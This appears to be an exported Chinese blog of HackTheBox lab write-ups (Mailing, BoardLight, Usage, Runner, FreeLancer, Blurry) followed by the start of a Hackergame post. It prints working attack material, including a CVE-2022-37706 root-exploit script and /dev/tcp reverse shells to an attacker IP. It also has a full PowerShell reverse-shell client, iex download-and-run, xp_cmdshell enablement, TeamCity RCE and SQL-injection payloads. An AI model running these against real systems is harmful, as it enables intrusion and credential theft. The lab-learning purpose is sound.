'\\\\10.10.14.20\\test' --subject Hi 拿到 maya 的 NTLM hash 1maya::MAILING:aaaaaaaaaaaaaaaa:21bf11591531fc6d3736359f495482b4:0101000000000000804c7084b5b1da013e5cd1bc6af81a5f000000000100100057005a00720067005a00460043005a000300100057005a00720067005a00460043005a00020010004f007100510070005500580055006800040010004f00710051007000550058005500680007000800804c7084b5b1da0106000400020000000800300030000000000000000000000000200000146f2fe8ad5fb58c04447d1f84d31aa0faae084bb712011964e5eb9820bf33200a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00320030000000000000000000 放到 1.txt，用 hashcat 爆 1hashcat -a 0 -o passwd.txt 1.txt /usr/share/wordlists/rockyou.txt -a 0 意思是字典模式，-o passwd.txt 是输出文件，1.txt 是输入文件，/usr/share/wordlists/rockyou.txt 是字典文件。爆出来密码是 m4y4ngs4ri。然后用红队神器 evil-winrm 连上，拿到 Windows 的 shell，读 user.txt 拿到第一个 flag。 1evil-winrm -i 10.10.11.14 -u maya -p m4y4ngs4ri 很奇怪这里用 hash 登录不行，会报错 Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError。 现在就要开始提权了。 Program Files 里有个 LibreOffice，查看 readme_en-US.txt 可以知道版本是 7.4。搜出是有 CVE-2023-2255 的，用 PoC 打把反弹 shell 的 shell.py 传到 C:\\Users\\maya\\Documents\\，然后本地生成 exploit.odt，再在 Windows 上 curl 下来。 1python3 CVE-2023-2255.py --cmd &quot;python C:\\Users\\maya\\Documents\\shell.py&quot; --output 'exploit.odt' 在本地挂着 nc -lvnp &lt;port&gt;，一会就有 shell 过来了。 弹到 localadmin 的 shell 后，可以直接读桌面的 root.txt 拿到 flag，也可以通过以下命令把 maya 提到管理员组： 1net localgroup Administradores maya /add 总的来说，这 Windows 的渗透是真迷糊，一点不会。而且不知道为啥 Evil-WinRM 连上后命令卡得要死 BoardLight扫出来两个端口，一个是 80，一个是 22。一个静态网页，无交互，源码里面有一个 Board.htb，加到 host 里面访问，还是这个页面。开始扫子域名 1wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u &quot;http://board.htb&quot; -H &quot;Host:FUZZ.board.htb&quot; --hw 1053 --hw 1053 是过滤掉 1053 字节的响应。扫到一个 crm.board.htb。加入 /etc/hosts 里，访问到是一个 Dolibarr 的登录页面，随手敲个 admin admin 竟然登上去了，乐。新建一个 website，再在里面新建一个 Page，编辑 HTML 源，写 PHP，保存会报 You add dynamic PHP code that contains the PHP instruction 'system' that is forbidden by default as dynamic content (see hidden options WEBSITE_PHP_ALLOW_xxx to increase list of allowed commands). 大写 PHP 绕过，有时也可以直接短标签 &lt;?，或者 &lt;?=system('ls')?&gt;，这句等效于 &lt;?php echo system('ls')?&gt;。在 Reverse Shell Generator 生成一个 PHP 反弹 shell，然后写进去记得勾上 Show dynamic content 1234&lt;?PHP ?&gt; 拿到 www-data 的 shell在 /var/www/html/crm.board.htb/htdocs/conf/ 下找到 conf.php，里面有数据库的用户名和密码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;?php//// File generated by Dolibarr installer 17.0.0 on May 13, 2024//// Take a look at conf.php.example file for an example of conf.php file// and explanations for all possibles parameters.//$dolibarr_main_url_root='http://crm.board.htb';$dolibarr_main_document_root='/var/www/html/crm.board.htb/htdocs';$dolibarr_main_url_root_alt='/custom';$dolibarr_main_document_root_alt='/var/www/html/crm.board.htb/htdocs/custom';$dolibarr_main_data_root='/var/www/html/crm.board.htb/documents';$dolibarr_main_db_host='localhost';$dolibarr_main_db_port='3306';$dolibarr_main_db_name='dolibarr';$dolibarr_main_db_prefix='llx_';$dolibarr_main_db_user='dolibarrowner';$dolibarr_main_db_pass='serverfun2$2023!!';$dolibarr_main_db_type='mysqli';$dolibarr_main_db_character_set='utf8';$dolibarr_main_db_collation='utf8_unicode_ci';// Authentication settings$dolibarr_main_authentication='dolibarr';//$dolibarr_main_demo='autologin,autopass';// Security settings$dolibarr_main_prod='0';$dolibarr_main_force_https='0';$dolibarr_main_restrict_os_commands='mysqldump, mysql, pg_dump, pgrestore';$dolibarr_nocsrfcheck='0';$dolibarr_main_instance_unique_id='ef9a8f59524328e3c36894a9ff0562b5';$dolibarr_mailing_limit_sendbyweb='0';$dolibarr_mailing_limit_sendbycli='0';//$dolibarr_lib_FPDF_PATH='';//$dolibarr_lib_TCPDF_PATH='';//$dolibarr_lib_FPDI_PATH='';//$dolibarr_lib_TCPDI_PATH='';//$dolibarr_lib_GEOIP_PATH='';//$dolibarr_lib_NUSOAP_PATH='';//$dolibarr_lib_ODTPHP_PATH='';//$dolibarr_lib_ODTPHP_PATHTOPCLZIP='';//$dolibarr_js_CKEDITOR='';//$dolibarr_js_JQUERY='';//$dolibarr_js_JQUERY_UI='';//$dolibarr_font_DOL_DEFAULT_TTF='';//$dolibarr_font_DOL_DEFAULT_TTF_BOLD='';$dolibarr_main_distrib='standard'; 登进数据库 1mysql -u dolibarrowner -p 然后连上 dolibarr 数据库，查看表 12use dolibarr;show tables; 发现没啥东西。ls /home 发现有个用户叫 larissa，用数据库的密码 ssh 进去，拿到第一个 flag。 然后开始提权传个 linpeas.sh 过去开扫，发现 SUID 项里有 enlightenment，执行 enlightenment -version 可知版本为 0.23.1。 searchsploit enlightenment 看到有个提权漏洞，再 searchsploit -p linux/local/51180.txt 看具体信息 123456 Exploit: Enlightenment v0.25.3 - Privilege escalation URL: https://www.exploit-db.com/exploits/51180 Path: /usr/share/exploitdb/exploits/linux/local/51180.txt Codes: CVE-2022-37706 Verified: FalseFile Type: ASCII text cat /usr/share/exploitdb/exploits/linux/local/51180.txt，里面说这个洞能打 0.25.3 以下版本，也给出了 PoC 如下： 1234567891011121314151617181920212223242526272829303132333435#!/usr/bin/bash# Idea by MaherAzzouz# Development by nu11secur1tyecho &quot;CVE-2022-37706&quot;echo &quot;[*] Trying to find the vulnerable SUID file...&quot;echo &quot;[*] This may take few seconds...&quot;# The actual problemfile=$(find / -name enlightenment_sys -perm -4000 2&gt;/dev/null | head -1)if [[ -z ${file} ]]then echo &quot;[-] Couldn't find the vulnerable SUID file...&quot; echo &quot;[*] Enlightenment should be installed on your system.&quot; exit 1fiecho &quot;[+] Vulnerable SUID binary found!&quot;echo &quot;[+] Trying to pop a root shell!&quot;mkdir -p /tmp/netmkdir -p &quot;/dev/../tmp/;/tmp/exploit&quot;echo &quot;/bin/sh&quot; &gt; /tmp/exploitchmod a+x /tmp/exploitecho &quot;[+] Welcome to the rabbit hole :)&quot;${file} /bin/mount -o noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u), &quot;/dev/../tmp/;/tmp/exploit&quot; /tmp///netread -p &quot;Press any key to clean the evedence...&quot;echo -e &quot;Please wait... &quot;sleep 5rm -rf /tmp/exploitrm -rf /tmp/netecho -e &quot;Done; Everything is clear ;)&quot; 中间的 ${file} 那行不知道为啥断行了，给它三句连起来，记得加空格。在靶机执行拿到 root 的 shell，读 root.txt 拿到第二个 flag。 Usage扫端口只有 80 和 22，老样子，先加 host 1sudo echo &quot;10.10.11.18 http://usage.htb&quot; &gt;&gt; /etc/hosts 然后访问，是一个登录页面，用 whatweb 看眼，发现是 Laravel 12$ whatweb http://usage.htb/http://usage.htb/ [200 OK] Bootstrap[4.1.3], Cookies[XSRF-TOKEN,laravel_session], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], HttpOnly[laravel_session], IP[10.10.11.18], Laravel, PasswordField[password], Title[Daily Blogs], UncommonHeaders[x-content-type-options], X-Frame-Options[SAMEORIGIN], X-XSS-Protection[1; mode=block], nginx[1.18.0] 在 Hacktricks 上有说存在 SQL 注入漏洞，测一下先注册一个 a@a.com 的用户，再在重置密码的 email 项输入 a@a.com'，发现引号能触发 500 错误，说明存在注入。 1a@a.com' AND 1=1;-- - 上面的语句的 response 是成功执行。于是把请求体复制到 request.txt，用 sqlmap 跑 12345678910111213141516POST http://usage.htb/forget-password HTTP/1.1Host: usage.htbContent-Length: 84Cache-Control: max-age=0Upgrade-Insecure-Requests: 1Origin: http://usage.htbContent-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Referer: http://usage.htb/forget-passwordAccept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9Cookie: XSRF-TOKEN=eyJpdiI6IkhFakpQK2l4cU5sYkhHZzZoN00rUmc9PSIsInZhbHVlIjoiYysvaTY0WDl1dXBXMGR2TzM5YWt2aEg4T051akNzTDFxcWJzUC9yY3pPajN4ei9FRTRJbzNuQ2htY0pmc25xWGR5anV6UzFHTkJ1N2tYYWlJcUEzNjZnSmNVMzdaa0hWNWlST3BVeTlqUnpBdVJ0aEVlOTVUSnBlNXdTa29UTk8iLCJtYWMiOiI0NzIxOTRkMTk4ZWEyN2E2YjI1YTA1NzI4ODg3MzFjZWM0YjJkZGRhNTZjOWYxZGVkNmRjMWRkNTYyNzYzMjUwIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6IktHWU1MYzFSNDBvSEN1M2dRSVJlTmc9PSIsInZhbHVlIjoib1FJU1RXWWxPV0ZRem5NNGJxUzR1QkdCdFpYMm8yWGxNblhFL0hIaFdnOWxSK3c0bStqNk9wY1Jsd3ZPZHFTTkdCWjByMnJNTkNnV21hZVJrZGZZcTdBbTFpT3YzOVBubENxT09FWTdBQlhPdEZoTGExMnZHdUZXZ0svOEF5cHkiLCJtYWMiOiI1NWNhNDg3OWZmOTEzNjkzNDMxZGNkZDVjODljMzBkMTRkYzcwZjU2MjI4ZDk5NTBkNzAxOTdhMzlkNTk3MzAxIiwidGFnIjoiIn0%3DConnection: close_token=KwTPctNAzmgzsn7wIgf7PC16p7nJ52U7AGT0MNHQ&amp;email=a%40a.com # 注意这里用手注的 payload &lt;这里想起来就补&gt; 用 john 爆出密码 whatever1，在 admin.usage.htb 登录。发现没什么能做的，只有头像能改，测试只有前端有文件后缀校验，于是传一个 PHP 反弹 shell 的 png 上去，再用 burp 改成 .php 再传一次，刷新页面，拿到 shell。传 linpeas.sh 开扫，发现 /home/dash/.ssh/id_rsa，下到本地，登录 12chmod 600 dash.pri # 不然不给连ssh -i dash.pri dash@10.10.11.18 /home/dash 目录下有个 .monitrc，内容如下： 12345678910111213141516171819202122232425#Monitoring Interval in Secondsset daemon 60#Enable Web Accessset httpd port 2812 use address 127.0.0.1 allow admin:3nc0d3d_pa$$w0rd#Apachecheck process apache with pidfile &quot;/var/run/apache2/apache2.pid&quot; if cpu &gt; 80% for 2 cycles then alert#System Monitoringcheck system usage if memory usage &gt; 80% for 2 cycles then alert if cpu usage (user) &gt; 70% for 2 cycles then alert if cpu usage (system) &gt; 30% then alert if cpu usage (wait) &gt; 20% then alert if loadavg (1min) &gt; 6 for 2 cycles then alert if loadavg (5min) &gt; 4 for 2 cycles then alert if swap usage &gt; 5% then alertcheck filesystem rootfs with path / if space usage &gt; 80% then alert 这里就藏着 xander 的密码 3nc0d3d_pa$$w0rd（感觉有点脑洞）登录后 sudo -l 看一眼，发现可以 sudo /usr/bin/usage_management，把文件拖下看用 IDA 看一眼 1234567891011121314151617181920212223242526272829303132333435int __cdecl main(int argc, const char **argv, const char **envp){ int v4; // [rsp+Ch] [rbp-4h] BYREF puts(&quot;Choose an option:&quot;); puts(&quot;1. Project Backup&quot;); puts(&quot;2. Backup MySQL data&quot;); puts(&quot;3. Reset admin password&quot;); printf(&quot;Enter your choice (1/2/3): &quot;); __isoc99_scanf(&quot;%d&quot;, &amp;v4); if ( v4 == 3 ) { resetAdminPassword(); } else { if ( v4 &gt; 3 ) {LABEL_9: puts(&quot;Invalid choice.&quot;); return 0; } if ( v4 == 1 ) { backupWebContent(); } else { if ( v4 != 2 ) goto LABEL_9; backupMysqlData(); } } return 0;} 发现 resetAdminPassword 是用来消遣你的 123456789101112131415int resetAdminPassword(){ return puts(&quot;Password has been reset.&quot;);}void backupWebContent(){ if ( chdir(&quot;/var/www/html&quot;) ) perror(&quot;Error changing working directory to /var/www/html&quot;); else system(&quot;/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *&quot;);}int backupMysqlData(){ return system(&quot;/usr/bin/mysqldump -A &gt; /var/backups/mysql_backup.sql&quot;);} 来分析一下这句命令 1/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- * 7za 是 7zip 的命令行版本，a 是添加文件到压缩包，位置为 /var/backups/project.zip，-tzip 指定压缩格式为 zip，-snl 将符号链接作为链接存储，即不是压缩其指向的内容，-mmt 是多线程压缩，-- 结束选项，* 压缩所有文件。Hacktricks 提到了利用这个的 trick，在 7z 中，@ 开头的文件名会被当作文件列表，所以如下命令执行的时候 7z 会把 root.txt 当作文件列表，然后尝试对 root.txt 里列出的文件进行压缩 123cd /var/www/htmltouch @root.txtln -s /root/root.txt root.txt 然后再执行备份命令，就能在报错信息看到 root.txt 的内容了。 软链接与硬链接 这里说一下软链接与硬链接的区别，软链接类似 Windows 中的快捷方式，可以跨越文件系统，硬链接则不行。所有硬链接，包括原文件指向的都是同一个 inode（索引节点），众生平等，除非只剩最后一个，否则删除一个硬链接不会影响其他硬链接，而软链接则不同，删除原文件会导致软链接失效。 生成方法上，软链接 ln -s；硬链接 ln，目录则需要 cp -al /path/to/dir /path/to/link。 一般来说，软链接用得多，硬链接用得少。 参考Two Millionhttps://h4r1337.github.io/posts/two-million/https://blog.csdn.net/song_lee/article/details/131245481Mailinghttps://blog.csdn.net/m0_52742680/article/details/138482768https://blog.csdn.net/whale_waves/article/details/138896310BoardLighthttps://blog.csdn.net/m0_52742680/article/details/139233464https://blog.csdn.net/2201_75526400/article/details/139304432Usagehttps://blog.csdn.net/zr1213159840/article/details/124548770https://amandaguglieri.github.io/hackinglife/htb-usage/","link":"/2024/05/17/HackTheBox%20%E7%AC%94%E8%AE%B0%20-%201/"},{"title":"HackTheBox 笔记 - 2","text":"Runner / FreeLancer / Blurry Runner扫端口，有 22，80，8000，访问 80 发现是个静态网页，dirsearch 也没扫出东西，再扫 8000，只有个 /health 和 /version 路由，也没什么用。再扫子域名，也没扫出来东西，一看 wp 原来人家用的超大字典，晕 1wfuzwfuzz -c -w /usr/share/seclists/Discovery/DNS/shubs-subdomains.txt -u &quot;http://runner.htb&quot; -H &quot;Host:FUZZ.runner.htb&quot; --hw 10 于是就扫出来 teamcity.runner.htb，访问，是个 TeamCity。搜一下 CVE： 1234567891011$ searchsploit teamcity------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------JetBrains TeamCity 2018.2.4 - Remote Code Execution | java/remote/47891.txtJetBrains TeamCity 2023.05.3 - Remote Code Execution (RCE) | java/remote/51884.pyTeamCity &lt; 9.0.2 - Disabled Registration Bypass | multiple/remote/46514.jsTeamCity Agent - XML-RPC Command Execution (Metasploit) | multiple/remote/45917.rbTeamCity Agent XML-RPC 10.0 - Remote Code Execution | php/webapps/48201.py------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------Shellcodes: No Results 网页写着 Version 2023.05.3 (build 129390)，这不正好是 CVE-2023-42793，直接 searchsploit -p java/remote/51884.py 找到 PoC 的位置，然后复制过来跑 1234567891011121314$ python 51884.py -u http://teamcity.runner.htb=====================================================* CVE-2023-42793 ** TeamCity Admin Account Creation ** ** Author: ByteHunter *=====================================================Token: eyJ0eXAiOiAiVENWMiJ9.SXpoSWFONE1EaGJ3SmowbGxLMmNfSmlaZkZV.NzU0ZDU4NzYtNzU3My00ZTgwLWFmNWMtMGIyNjliZjY0ZDkwSuccessfully exploited!URL: http://teamcity.runner.htbUsername: city_adminOpx8Password: Main_password!!** 把 Token 存到文件 token，然后执行这个 PoC 1python rce.py -u http://teamcity.runner.htb -t token -c '&quot;/bin/bash&quot;&amp;params=&quot;-c&quot;&amp;params=&quot;sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.16.18%2F55555%200%3E%261&quot;' 然后就拿到 shell 了，得到第一个 flag。注意这里是 docker 的 shell，执行 python3 -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)' 换个 shell（不知道和直接 bash 有啥区别），传 linpeas.sh 执行没找到啥，但是能搜到一个 id_rsa。 1find / -name id_rsa 2&gt; /dev/null 这里 2&gt; /dev/null 是把 stderr 重定向到 /dev/null，不然会有很多权限不足的提示。在网站中的 User 里有个 john，然后就可以用这个 id_rsa 登录 john 了。 12chmod 600 id_rsassh john@runner.htb -i id_rsa 一开始报 Load key &quot;id_rsa&quot;: error in libcrypto，原来是末尾少打一个换行。再传 linpeas.sh 扫一轮，发现 /etc/hosts 里还有个域名叫 portainer-administration.runner.htb，加到本机里，然后访问，发现是个 Portainer，查漏洞，没有。 之前的网站是有个备份的，下载下来能找到 users，内容如下： 1234ID, USERNAME, PASSWORD, NAME, EMAIL, LAST_LOGIN_TIMESTAMP, ALGORITHM1, admin, $2a$07$neV5T/BlEDiMQUs.gM1p4uYl8xl8kvNUo4/8Aja2sAWHAQLWqufye, John, john@runner.htb, 1717486715003, BCRYPT2, matthew, $2a$07$q.m8WQP8niXODv55lJVovOmxGtg6K/YPHbD48/JQsdGLulmeVo.Em, Matthew, matthew@runner.htb, 1709150421438, BCRYPT11, city_adminopx8, $2a$07$K1PwHspWALRGHbsy0XaPOe7cIK2IVF5hkq8DS/t0L6ulKDCNoACY2, , angry-admin@funnybunny.org, 1717487324779, BCRYPT 用 john 把 matthew 的密码爆出来，为 piper123，注意 john 会把结果存在 ~/.john/john.pot 里，再跑的话要 john --show hash.txt 才能显示。 用这个去登录 Portainer，然后用 CVE-2024-21626 打 docker 逃逸，启动一个 container，把 working dir 挂到 /proc/self/fd/8，网页 shell 不好使，用 bash 弹个 shell 回来： 1bash -i &gt;&amp; /dev/tcp/10.10.16.18/55555 0&gt;&amp;1 然后 cat ../../../root/root.txt 就拿到第二个 flag 了。无聊的时候想用 john 爆 /etc/shadow 里 root 的密码，发现还得加 --format=crypt。 后继小研究发现 docker 里面没有 nano 也没有 vim，但是有 sed，执行如下命令： 1sed -i 's/root:x:/root::/' ../../../etc/passwd 然后就可以 su root 了，执行 crontab -e，发现有个定时任务。 1234@reboot docker start kind_leavitt@reboot /root/monitor.sh*/5 * * * * /root/monitor.sh*/2 * * * * /root/docker_clean.sh 浅谈 Docker 涉及的一些概念cgroup（Control Groups）是 Linux 内核提供的一种机制，用于限制、记录和隔离进程组（如容器）的资源使用情况（如 CPU、内存、磁盘 I/O、网络带宽等）。cgroup 可以帮助系统管理员分配系统资源，以确保每个容器或进程组都能获得足够的资源，并防止单个容器或进程组消耗过多资源而影响其他容器或进程组的正常运行。runC 是一个符合 Open Container Initiative (OCI) 规范的容器运行时。它是一个轻量级的运行时，负责创建和运行容器。runC 可以被认为是 Docker 的默认底层运行时之一。runC 提供了对容器的直接管理接口，Docker 利用 runC 来实际执行容器操作。containerd 是一个高层次的容器运行时，由 Docker Inc. 维护。containerd 提供了容器生命周期管理的高级 API，支持创建、管理和运行容器。它内部可以调用 runC 或其他 OCI 兼容的运行时来实际执行容器操作。containerd 是 Docker 的核心组件之一，负责管理容器运行时的交互。CRI-O 是 Kubernetes 的一个容器运行时接口（CRI）实现，专门为 Kubernetes 设计。它直接运行 OCI 容器，使用 runC 或 Kata Containers 作为底层运行时。CRI-O 提供了一个轻量级的运行时环境，专注于 Kubernetes 的需求。 总结：Docker 使用 containerd 作为其核心运行时，containerd 内部则调用 runC 或其他运行时来实际管理容器，所有的容器运行时都依赖 cgroup 来实现资源隔离和管理。 FreeLancerfscan 开扫，疑惑了很久怎么打，原来是环境问题，80 端口我没扫到，现在应该修好了。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647$ fscan -h 10.10.11.5 -p 1-65535 ___ _ / _ \\ ___ ___ _ __ __ _ ___| | __ / /_\\/____/ __|/ __| '__/ _` |/ __| |/ // /_\\\\_____\\__ \\ (__| | | (_| | (__| &lt;\\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ fscan version: 1.8.4start infoscan10.10.11.5:88 open10.10.11.5:139 open10.10.11.5:135 open10.10.11.5:53 open10.10.11.5:593 open10.10.11.5:80 open10.10.11.5:464 open10.10.11.5:389 open10.10.11.5:445 open10.10.11.5:636 open10.10.11.5:3269 open10.10.11.5:3268 open10.10.11.5:5985 open10.10.11.5:9389 open10.10.11.5:47001 open10.10.11.5:49667 open10.10.11.5:49669 open10.10.11.5:49665 open10.10.11.5:49671 open10.10.11.5:49670 open10.10.11.5:49664 open10.10.11.5:49675 open10.10.11.5:49672 open10.10.11.5:49666 open10.10.11.5:49815 open10.10.11.5:55297 open[*] alive ports len is: 26start vulscan[*] WebTitle http://10.10.11.5 code:302 len:0 title:None 跳转url: http://freelancer.htb/[*] NetInfo[*]10.10.11.5 [-&gt;]DC [-&gt;]10.10.11.5[*] WebTitle http://10.10.11.5:5985 code:404 len:315 title:Not Found[*] WebTitle http://10.10.11.5:47001 code:404 len:315 title:Not Found[*] WebTitle http://freelancer.htb/ code:200 len:57293 title:Freelancer - Job Board &amp; Hiring platform已完成 26/26[*] 扫描结束,耗时: 1m15.097074037s 老样子加进 hosts，访问，是个招聘网站，用 dirsearch 一顿扫，结果里面一堆 /admin 路由的。注册了一个 employer 的帐号，密码还不能太简单，登录说没激活，点击忘记密码，重置一次，就能登录了。有个二维码登录的功能，说用手机扫就能直接登录，随便找个在线识别网站识别出 http://freelancer.htb/accounts/login/otp/MTAwMTA=/700a374a3c075b4da499d76a39953af6/ MTAwMTA= base64 解出是 10010，猜测是用户的 ID，后面应该是关于时间的凭据。在 Blog 里随便发表一条评论，然后自己的链接就是 http://freelancer.htb/accounts/profile/visit/10010/ ，那么就八九不离十了，从 1 开始试，发现 http://freelancer.htb/accounts/profile/visit/2/ 可以访问到，而且 username 是 admin，那么尝试伪造 admin 登录，2 对应 base64 即为 Mg==，拼接链接 http://freelancer.htb/accounts/login/otp/Mg==/700a374a3c075b4da499d76a39953af6/ 成功登录 admin。 登上之后页面和之前差不多，直接进 /admin 路由，到了管理页面。一眼看到 SQL Terminal，GPT 说可以用 xp_cmdshell 执行命令，发现没权限 执行如下命令： 12SELECT name AS DatabaseName, suser_sname(owner_sid) AS OwnerFROM sys.databases; 可以看到 Owner 全部是 sa，然后模拟 sa 登录，执行如下命令启用 xp_cmdshell： 12345EXECUTE AS LOGIN = 'sa'EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE; 再 1EXEC xp_cmdshell 'dir' 发现命令执行成功。想弹个 shell，搞着搞着发现 bash 不了，才想起来这是 Windows 1EXECUTE xp_cmdshell 'powershell -c iex(iwr -usebasicparsing http://10.10.16.18/1.ps1)' 发现弹了一下就断了，应该是被杀软掐了。试了很多个都不行，没办法了，用大哥找到的： 12345678910111213141516171819202122232425262728293031323334353637383940414243do { # Delay before establishing network connection, and between retries Start-Sleep -Seconds 1 # Connect to C2 try{ $TCPClient = New-Object Net.Sockets.TCPClient('10.10.16.18',55555) } catch {}} until ($TCPClient.Connected)$NetworkStream = $TCPClient.GetStream()$StreamWriter = New-Object IO.StreamWriter($NetworkStream)# Writes a string to C2function WriteToStream ($String) { # Create buffer to be used for next network stream read. Size is determined by the TCP client recieve buffer (65536 by default) [byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0} # Write to C2 $StreamWriter.Write($String + 'SHELL&gt; ') $StreamWriter.Flush()}# Initial output to C2. The function also creates the inital empty byte array buffer used below.WriteToStream ''# Loop that breaks if NetworkStream.Read throws an exception - will happen if connection is closed.while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) { # Encode command, remove last byte/newline $Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1) # Execute command and save output (including errors thrown) $Output = try { Invoke-Expression $Command 2&gt;&amp;1 | Out-String } catch { $_ | Out-String } # Write output to C2 WriteToStream ($Output)}# Closes the StreamWriter and the underlying TCPClient$StreamWriter.Close() 看到用户文件夹下的 Download 有个 SQLEXPR-2019_x64_ENU 目录，进去发现 sql-Configuration.INI，内容如下： 123456789101112131415161718192021222324252627[OPTIONS]ACTION=&quot;Install&quot;QUIET=&quot;True&quot;FEATURES=SQLINSTANCENAME=&quot;SQLEXPRESS&quot;INSTANCEID=&quot;SQLEXPRESS&quot;RSSVCACCOUNT=&quot;NT Service\\ReportServer$SQLEXPRESS&quot;AGTSVCACCOUNT=&quot;NT AUTHORITY\\NETWORK SERVICE&quot;AGTSVCSTARTUPTYPE=&quot;Manual&quot;COMMFABRICPORT=&quot;0&quot;COMMFABRICNETWORKLEVEL=&quot;&quot;0&quot;COMMFABRICENCRYPTION=&quot;0&quot;MATRIXCMBRICKCOMMPORT=&quot;0&quot;SQLSVCSTARTUPTYPE=&quot;Automatic&quot;FILESTREAMLEVEL=&quot;0&quot;ENABLERANU=&quot;False&quot;SQLCOLLATION=&quot;SQL_Latin1_General_CP1_CI_AS&quot;SQLSVCACCOUNT=&quot;FREELANCER\\sql_svc&quot;SQLSVCPASSWORD=&quot;IL0v3ErenY3ager&quot;SQLSYSADMINACCOUNTS=&quot;FREELANCER\\Administrator&quot;SECURITYMODE=&quot;SQL&quot;SAPWD=&quot;t3mp0r@ryS@PWD&quot;ADDCURRENTUSERASSQLADMIN=&quot;False&quot;TCPENABLED=&quot;1&quot;NPENABLED=&quot;1&quot;BROWSERSVCSTARTUPTYPE=&quot;Automatic&quot;IAcceptSQLServerLicenseTerms=True 用这两个密码和 Users 文件夹下的用户开爆 12345678910$ craccrackmapexec smb 10.10.11.5 -u user.txt -p passwd.txtSMB 10.10.11.5 445 DC [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:freelancer.htb) (signing:True) (SMBv1:False)SMB 10.10.11.5 445 DC [-] freelancer.htb\\Administrator:t3mp0r@ryS@PWD STATUS_LOGON_FAILURESMB 10.10.11.5 445 DC [-] freelancer.htb\\lkazanof:t3mp0r@ryS@PWD STATUS_LOGON_FAILURE ILURESMB 10.10.11.5 445 DC [-] freelancer.htb\\lkazanof:IL0v3ErenY3ager STATUS_LOGON_FAILURESMB 10.10.11.5 445 DC [-] freelancer.htb\\lorra199:t3mp0r@ryS@PWD STATUS_LOGON_FAILURESMB 10.10.11.5 445 DC [-] freelancer.htb\\lorra199:IL0v3ErenY3ager STATUS_LOGON_FAILURESMB 10.10.11.5 445 DC [-] freelancer.htb\\mikasaAckerman:t3mp0r@ryS@PWD STATUS_LOGON_FAILURESMB 10.10.11.5 445 DC [+] freelancer.htb\\mikasaAckerman:IL0v3ErenY3ager 爆出来 mikasaAckerman/IL0v3ErenY3ager，然后传 RunasCs 横向移动，执行 1./RunasCs.exe mikasaAckerman IL0v3ErenY3ager powershell -r 10.10.16.18:55556 把 mikasaAckerman 的 shell 弹出来，在 Desktop 下找到第一个 flag。这里不知道为啥用 evil-winrm 连不上，可能是因为权限问题。 system flag 涉及域渗透，一点不会。桌面还有个 mail.txt，内容如下： 12345Hello Mikasa,I tried once again to work with Liza Kazanoff after seeking her help to troubleshoot the BSOD issue on the &quot;DATACENTER-2019&quot; computer. As you know, the problem started occurring after we installed the new update of SQL Server 2019.I attempted the solutions you provided in your last email, but unfortunately, there was no improvement. Whenever we try to establish a remote SQL connection to the installed instance, the server's CPU starts overheating, and the RAM usage keeps increasing until the BSOD appears, forcing the server to restart.Nevertheless, Liza has requested me to generate a full memory dump on the Datacenter and send it to you for further assistance in troubleshooting the issue.Best regards, 翻译一下就是 1234567891011你好，米卡萨，我再次尝试与丽莎·卡扎诺夫合作，寻求她的帮助以解决“DATACENTER-2019”电脑上的蓝屏死机（BSOD）问题。正如你所知，这个问题在我们安装了 SQL Server 2019 的新更新后开始出现。我尝试了你在上封邮件中提供的解决方案，但不幸的是，没有任何改进。每当我们尝试与安装的实例建立远程 SQL 连接时，服务器的 CPU 就会开始过热，RAM 使用量不断增加，直到出现蓝屏死机，迫使服务器重启。然而，丽莎要求我在数据中心生成一个完整的内存转储，并将其发送给你以便进一步协助解决问题。此致最佳问候 意思就是他把内存 dump 下来了，看样子应该就是 Desktop 下的 MEMORY.7z，如何把这个文件传出来费了很大劲。 Blurryfscan 开扫 123456start infoscan10.10.11.19:80 open10.10.11.19:22 open[*] alive ports len is: 2start vulscan[*] WebTitle http://10.10.11.19 code:301 len:169 title:301 Moved Permanently 跳转url: http://app.blurry.htb/ 参考Runnerhttps://cerb3rus.medium.com/hackthebox-runner-writeup-466ffd800632https://blog.csdn.net/m0_52742680/article/details/138076335https://nitroc.org/posts/cve-2024-21626-illustrated/ FreeLancerhttps://blog.csdn.net/m0_52742680/article/details/139441094","link":"/2024/06/04/HackTheBox%20%E7%AC%94%E8%AE%B0%20-%202/"},{"title":"Hackergame 2021 writeups","text":"第一次打CTF比赛 Summary作为新手，第一次参加 CTF ，题目比 MSClub 的招新 puzzle 难得多，但是也好玩得多，前两天有幸短暂地在总榜停留过（或者只是第一天？忘了），最终组内排名第四（因为校内的大佬不在）（ GZTime tql ，凌晨肝神冲到总榜第四orz，此处附上 wp 传送门）。比赛的题目出得都非常得有趣 （除了透明的文件），对新手来说体验确实不错，也确实是名副其实的 pythongame（零基础强行入门），做到灯那题的时候我面对线性非齐次方程组的无穷多解毫无头绪，这彻底燃起了我学线代的激情（嗯，有意思），最后我交的第一个错误的 flag 